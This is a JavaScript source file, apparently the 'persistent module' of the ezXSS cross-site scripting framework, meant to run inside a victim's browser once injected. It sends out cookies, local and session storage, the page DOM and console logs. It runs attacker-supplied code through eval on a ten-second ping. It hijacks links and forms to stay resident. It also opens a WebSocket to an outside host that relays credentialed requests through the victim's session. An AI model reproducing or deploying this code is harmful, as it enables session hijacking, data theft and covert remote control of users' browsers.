// ezXSS persistent module
var ez_we,ez_las="",ez_ind=null,ez_exi=false;function ez_pin(){try{if(ez_exi){return}ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}
if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a){var d=new Date().toLocaleTimeString();return "["+d+" "+t+"] "+Array.prototype.join.call(a," ")+"\n";}function ez_wra(m,t){var dm=console[m];console[m]=function (){console.ez=ez_for(t,arguments)+console.ez;dm.apply(console,arguments);};}for(var i=0;i<ms.length;i++){ez_wra(ms[i],ms[i].toUpperCase());}}
function ra_client(){var e="ezXSS",r,t,a,n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o;try{r="localStorage"in window&&null!==window.localStorage}catch(e){r=!1}r?(t=localStorage.getItem(e),t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),localStorage.setItem("ezXSS",t))):(a=document.cookie.split(";").map(function(e){return e.trim()}).filter(function(r){return 0===r.indexOf(e)}),t=a.length>0?a[0].substring(e.length):null,t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),(o=new Date).setFullYear(o.getFullYear()+1),o=o.toUTCString().replace("GMT",""),document.cookie=e+"="+t+";expires="+o+";path=/;SameSite=lax;"));return t}
function ez_stop(){ez_exi=true}

function ra_hL(){if(!ez_exi){ez_rD.type="init",ez_rD.console=console.ez;try{ez_rD.clientid=ra_client()}catch(t){ez_rD.clientid=""}try{ez_rD.method="persist"}catch(e){ez_rD.method=""}try{ez_rD.uri=ez_n(location.toString())}catch(r){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(c){ez_rD.cookies=""}try{""!=ez_las?ez_rD.referer=ez_n(ez_las):ez_rD.referer=ez_n(document.referrer)}catch(o){ez_rD.referer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(i){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(a){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage)}catch(s){ez_rD.localstorage=""}try{ez_rD.sessionstorage=ez_n(window.sessionStorage)}catch(n){ez_rD.sessionstorage=""}try{ez_rD.dom=ez_n(document.documentElement.outerHTML),h()}catch(g){ez_rD.dom="",h()}}function h(){ra_r()}}
function ez_dol(t,e,r=""){if(ez_las=ez_n(location.toString()),""===r)var n=t.match(/<title[^>]*>([^<]+)<\/title>/),r=n?n[1]:"";document.title=r,window.history.pushState({html:t,pageTitle:r},"",e),document.getElementsByTagName("html")[0].innerHTML=t,window.scrollTo(0,0);var l=document.createElement("div");l.innerHTML=t;for(var a=l.getElementsByTagName("script"),i=0;i<a.length;i++){var o=document.createElement("script");a[i].src?o.src=a[i].src:o.textContent=a[i].textContent,document.body.appendChild(o),o.parentNode.removeChild(o)}}

function ra_li(e){var r=document.createElement("a");if(r.href=e,r.hostname===window.location.hostname){if("#"===r.href.slice(-1)&&""===r.hash)return;if(""!==r.hash&&r.href.replace(r.hash,"")===window.location.href.split("#")[0]){var t=r.hash.replace("#",""),n=document.getElementById(t).offsetTop;window.history.pushState("",document.title,r.href),window.scrollTo(0,n);return}var o=new XMLHttpRequest;o.onload=function(){4==this.readyState&&(ez_dol(this.responseText,r.href),eze_ini())},o.onerror=function(){window.open(r.href,"_blank").focus()},o.open("GET",r.href),o.send()}else window.open(r.href,"_blank").focus()}

function ez_hac(e){var t=(e=e||window.event).target||e.srcElement,r=function(){for(var e=t;e;){if(e.tagName&&"a"===e.tagName.toLowerCase())return e;e=e.parentNode}return null}();r&&!r.href.startsWith("javascript:")&&(e.preventDefault?e.preventDefault():e.returnValue=!1,ra_li(r.getAttribute("href")))}

function ra_fo(t){(t=t||window.event).preventDefault?t.preventDefault():t.returnValue=!1;var e=document.createElement("a");if(e.href=this.action,e.hostname===window.location.hostname){var a=new XMLHttpRequest;a.open("POST",this.action,!0),a.onreadystatechange=function(){4==this.readyState&&(ez_dol(this.responseText,e.href),eze_ini())};var n=new FormData(this);this.dataset.clickedButtonName&&this.dataset.clickedButtonValue&&n.append(this.dataset.clickedButtonName,this.dataset.clickedButtonValue),a.send(n)}else{var s=window.open(this.action,"_blank");s&&s.focus&&(this.target="_blank",t.preventDefault&&t.preventDefault(),this.submit())}}

function ez_hab(t){var e=t.target||t.srcElement,a=e.form;a.dataset.clickedButtonName=e.name,a.dataset.clickedButtonValue=e.value}function ez_hap(t){t.state&&t.state.html&&t.state.pageTitle&&(ez_dol(t.state.html,t.state.url,t.state.pageTitle),eze_ini())}

function ez_fet(url, method = 'GET', postData = null) {
    return new Promise(function (resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.withCredentials = true;
        xhr.responseType = "arraybuffer";

        if (method === 'POST' && postData) {
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        }

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                var base64 = btoa(
                    new Uint8Array(xhr.response).reduce(
                        (data, byte) => data + String.fromCharCode(byte),
                        ""
                    )
                );
                resolve({
                    statusCode: xhr.status,
                    body: base64,
                    contentType: xhr.getResponseHeader("Content-Type")
                });
            }
        };
        xhr.onerror = function () {
            reject(new Error("Failed to load content"));
        };
        xhr.send(postData);
    });
}

function ez_soc(h, p=0) {
    if (ez_we && ez_we.readyState === WebSocket.OPEN) {
        return;
    }

    ez_we = new WebSocket('wss://' + h);

    ez_we.onopen = function () {
        ez_we.send(JSON.stringify({ 'clientid': ra_client(), 'pass': p, 'origin': location.host }));
    };

    ez_we.onmessage = function (event) {
        const data = JSON.parse(event.data);
        if (data.do == "GET" || data.do == "POST") {
            ez_fet(data.request_uri, data.do, data.postData)
                .then(function (response) {
                    ez_we.send(
                        JSON.stringify({
                            clientid: ra_client(),
                            statusCode: response.statusCode,
                            body: response.body,
                            request_uri: data.request_uri,
                            content_type: response.contentType,
                            pass: p,
                            origin: location.host
                        })
                    );
                })
                .catch(function (error) {
                    console.error(error);
                });
        }
    };

    ez_we.onerror = function (error) {};

    ez_we.onclose = function () {
        setTimeout(function() {
            ez_soc(h,p);
        }, 5000);
    };
}

function ra_r() {
    if(ez_exi){return}

    var links = document.getElementsByTagName('a');
  
    for (var i = 0; i < links.length; i++) {
      var link = links[i];
  
      if (link.addEventListener) {
        link.addEventListener('click', ez_hac, false);
      } else if (link.attachEvent) {
        link.attachEvent('onclick', ez_hac);
      }
    }

    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        var form = forms[i];
        var submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');

        if (form.addEventListener) {
        form.addEventListener('submit', ra_fo, false);
        } else if (form.attachEvent) {
        form.attachEvent('onsubmit', ra_fo);
        }

        for (var j = 0; j < submitButtons.length; j++) {
            var submitButton = submitButtons[j];
            
            if (submitButton.addEventListener) {
              submitButton.addEventListener('click', ez_hab, false);
            } else if (submitButton.attachEvent) {
              submitButton.attachEvent('onclick', ez_hab);
            }
          }
    }

    if (window.addEventListener) {
        window.addEventListener('popstate', ez_hap, false);
      } else if (window.attachEvent) {
        window.attachEvent('onpopstate', ez_hap);
      }
}